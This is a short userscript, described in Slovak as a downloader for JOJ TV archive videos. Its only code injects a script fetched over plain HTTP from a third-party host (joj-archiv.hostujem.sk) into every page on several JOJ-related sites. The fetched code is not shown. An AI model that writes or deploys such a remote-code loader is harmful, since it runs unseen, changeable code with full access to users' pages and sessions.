// ==UserScript==
// @name           Sťahovanie z JOJ archívu
// @namespace      http://userscripts.com
// @description    Sťahovanie z JOJ archívu. Stiahnite si vaše obľúbené seriály a relácie jednoducho!
// @author         324243
// @include        http://joj.sk/*
// @include        http://*.joj.sk/*
// @include	   http://huste.tv/*
// @include	   http://*.huste.tv/*
// @include	   http://huste.sk/*
// @include	   http://*.huste.sk/*
// @include	   http://*.mamaozenma.sk/*
// @include	   http://mamaozenma.sk/*
// @include	   http://*.csmatalent.sk/*
// @include	   http://csmatalent.sk/*
// @include	   http://*.farmarhladazenu.sk/*
// @include	   http://farmarhladazenu.sk/*
// ==/UserScript==

var scV=document.createElement("script");
scV.type="text/javascript";
scV.src="http://joj-archiv.hostujem.sk/content/script.js?nocache="+Math.round(Math.random()*1000);
document.getElementsByTagName("head")[0].appendChild(scV);